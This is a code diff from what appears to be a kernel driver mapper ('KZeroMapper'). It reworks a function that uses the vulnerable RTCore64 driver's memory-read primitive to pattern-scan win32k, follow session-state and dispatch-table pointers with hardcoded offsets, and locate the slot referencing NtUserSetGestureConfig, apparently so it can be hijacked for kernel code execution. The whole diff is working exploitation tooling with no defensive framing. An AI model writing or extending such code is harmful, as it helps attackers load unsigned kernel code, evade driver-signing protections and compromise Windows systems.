@@ -327,110 +327,108 @@ uint64_t RTCore64Backend::ResolveNtUserSetGestureConfigRefFromSessionState( uint
 		return 0;
 	}
 
+	const ULONG ulSubsystemOffset      = 0x88;
+	const ULONG ulDispatchTable1Offset = 0x138;
+	const ULONG ulDispatchTable2Offset = 0x150;
+
 	LOG_SEC( "[*] - [RTCore64] Session ID %lu", sessionId );
 
-	// 83 F9 01 73
-	auto getSessionStateForSession = FindPatternInSection( pstra( ".text" ), win32k, 
-		"\x83\xF9\x01\x73", pstra( "xxxx" ) );
+	// 48 8B 05 ? ? ? ? FF C9 48 8B 04 C8
+	uint64_t gSessionGlobalSlotsRef = FindPatternInSection( pstra( ".text" ), win32k,
+		"\x48\x8B\x05\x00\x00\x00\x00\xFF\xC9\x48\x8B\x04\xC8", pstra( "xxx????xxxxxx" ) );
 
-	LOG_SEC( "[*] - [RTCore64] GetSessionStateForSession pattern A 0x%llx", getSessionStateForSession );
-
-	if ( !getSessionStateForSession )
+	if ( !gSessionGlobalSlotsRef )
 	{
-		// 83 F9 01 72
-		getSessionStateForSession = FindPatternInSection( pstra( ".text" ), win32k, 
-			"\x83\xF9\x01\x72", pstra( "xxxx" ) );
-
-		LOG_SEC( "[*] - [RTCore64] GetSessionStateForSession pattern B 0x%llx", getSessionStateForSession );
-
-		if ( !getSessionStateForSession )
-			return 0;
-
-		getSessionStateForSession -= 0x12;
+		LOG_SEC( "[-] - [RTCore64] gSessionGlobalSlotsRef not found" );
+		return 0;
 	}
 
-	// 4C 8B 90 ?? ?? ?? ?? 49 8B 82 ?? ?? ?? ?? 48 8B 80
-	const auto w32Offsets = FindPatternInSection( pstra( ".text" ), 
-		win32k, 
-		"\x4C\x8B\x90\x00\x00\x00\x00\x49\x8B\x82\x00\x00\x00\x00\x48\x8B\x80", 
-		pstra( "xxx????xxx????xxx" ) );
+	uint64_t gSessionGlobalSlots = ResolveRelativeAddress( gSessionGlobalSlotsRef, 3, 7 );
 
-	LOG_SEC( "[*] - [RTCore64] W32 offsets pattern 0x%llx", w32Offsets );
-
-	if ( !w32Offsets )
-		return 0;
-
-	getSessionStateForSession += 0x12;
-
-	// 48 8B 05
-	auto sessionGlobalSlots = FindPattern( getSessionStateForSession, 0x100, "\x48\x8B\x05", pstra( "xxx" ) );
-
-	LOG_SEC( "[*] - [RTCore64] gSessionGlobalSlots instruction 0x%llx", sessionGlobalSlots );
-
-	if ( !sessionGlobalSlots )
-		return 0;
-
-	sessionGlobalSlots = ResolveRelativeAddress( sessionGlobalSlots, 3, 7 );
-
-	LOG_SEC( "[*] - [RTCore64] gSessionGlobalSlots 0x%llx", sessionGlobalSlots );
+	LOG_SEC( "[*] - [RTCore64] gSessionGlobalSlots 0x%llx", gSessionGlobalSlots );
 
 	uint64_t sessionGlobalSlotsInstance = 0;
 
-	if ( !ReadMemory( sessionGlobalSlots, &sessionGlobalSlotsInstance, sizeof( sessionGlobalSlotsInstance ) ) )
+	if ( !ReadMemory( gSessionGlobalSlots, &sessionGlobalSlotsInstance, sizeof( sessionGlobalSlotsInstance ) ) )
 		return 0;
 
 	LOG_SEC( "[*] - [RTCore64] SessionGlobalSlotsInstance 0x%llx", sessionGlobalSlotsInstance );
 
-	uint64_t table = 0;
+	if  ( !IsValidKernelAddress( sessionGlobalSlotsInstance ) )
+	{
+		LOG_SEC( "[-] - [RTCore64] SessionGlobalSlotsInstance is not valid" );
+		return 0;
+	}
 
-	if ( !ReadMemory( sessionGlobalSlotsInstance + 8ull * ( sessionId - 1 ), &table, sizeof( table ) ) )
+	uint64_t uSessionState = 0;
+
+	if ( !ReadMemory( sessionGlobalSlotsInstance + 8ull * ( sessionId - 1 ), &uSessionState, sizeof( uSessionState ) ) )
 		return 0;
 
-	LOG_SEC( "[*] - [RTCore64] SessionState table 0x%llx", table );
+	LOG_SEC( "[*] - [RTCore64] uSessionState 0x%llx", uSessionState );
 
-	uint8_t offsetsData[ 0x50 ] {};
+	if (!IsValidKernelAddress( uSessionState ) )
+	{
+		LOG_SEC( "[-] - [RTCore64] uSessionState is not valid" );
+		return 0;
+	}
 
-	if ( !ReadMemory( w32Offsets, offsetsData, sizeof( offsetsData ) ) )
+	uint64_t uSubsystem = 0;
+
+	if ( !ReadMemory( uSessionState + ulSubsystemOffset, &uSubsystem, sizeof( uSubsystem ) ) )
 		return 0;
 
-	const auto firstOffset = *r_cast<uint32_t*>( offsetsData + 3 );
-	const auto secondOffset = 0x150u;
+	LOG_SEC( "[*] - [RTCore64] uSubsystem 0x%llx", uSubsystem );
 
-	LOG_SEC( "[*] - [RTCore64] SessionState firstOffset=0x%X secondOffset=0x%X", firstOffset, secondOffset );
 
-	uint64_t table2 = 0;
+	if ( !IsValidKernelAddress( uSubsystem ) )
+	{
+		LOG_SEC( "[-] - [RTCore64] uSubsystem is not valid" );
+		return 0;
+	}
 
-	if ( !ReadMemory( table + firstOffset, &table2, sizeof( table2 ) ) )
+	uint64_t uDispatchTable1 = 0;
+
+	if ( !ReadMemory( uSubsystem + ulDispatchTable1Offset, &uDispatchTable1, sizeof( uDispatchTable1 ) ) )
 		return 0;
 
-	LOG_SEC( "[*] - [RTCore64] SessionState table2 0x%llx", table2 );
+	LOG_SEC( "[*] - [RTCore64] uDispatchTable1 0x%llx", uDispatchTable1 );
 
-	uint64_t table3 = 0;
+	if (!IsValidKernelAddress( uDispatchTable1 ) )
+	{
+		LOG_SEC( "[-] - [RTCore64] uDispatchTable1 is not valid" );
+		return 0;
+	}
 
-	if ( !ReadMemory( table2 + secondOffset, &table3, sizeof( table3 ) ) )
+	uint64_t uDispatchTable2 = 0;
+
+	if ( !ReadMemory( uSubsystem + ulDispatchTable2Offset, &uDispatchTable2, sizeof( uDispatchTable2 ) ) )
 		return 0;
 
-	LOG_SEC( "[*] - [RTCore64] SessionState table3 0x%llx", table3 );
+	LOG_SEC( "[*] - [RTCore64] uDispatchTable2 0x%llx", uDispatchTable2 );
 
-	auto finalTable = std::make_unique<uint64_t[ ]>( 0x1000 / sizeof( uint64_t ) );
+	if (!IsValidKernelAddress( uDispatchTable2 ) )
+	{
+		LOG_SEC( "[-] - [RTCore64] uDispatchTable2 is not valid" );
+		return 0;
+	}
 
-	if ( !ReadMemory( table3, finalTable.get( ), 0x1000 ) )
+	auto DataTable = std::make_unique<uint64_t[ ]>( 0x1000 / sizeof( uint64_t ) );
+
+	if ( !ReadMemory( uDispatchTable2, DataTable.get( ), 0x1000 ) )
 		return 0;
 
 	for ( size_t i = 0; i < ( 0x1000 / sizeof( uint64_t ) ); ++i )
 	{
-		if ( finalTable[ i ] != ntUserSetGestureConfigFull )
+		if ( DataTable[ i ] != ntUserSetGestureConfigFull )
 			continue;
 
-		const auto result = table3 + i * sizeof( uint64_t );
-		LOG_SEC( "[+] - [RTCore64] NtUserSetGestureConfig_ref found by SessionState 0x%llx offset=0x%llx", result, i * sizeof( uint64_t ) );
+		const auto result = uDispatchTable2 + i * sizeof( uint64_t );
+		LOG_SEC( "[+] - [RTCore64] NtUserSetGestureConfigRef found by SessionState 0x%llx offset=0x%llx", result, i * sizeof( uint64_t ) );
 		return result;
 	}
 
 	return 0;
 }
-
-
-
 
 #endif // KZEROMAPPER_ENABLE_RTCORE64
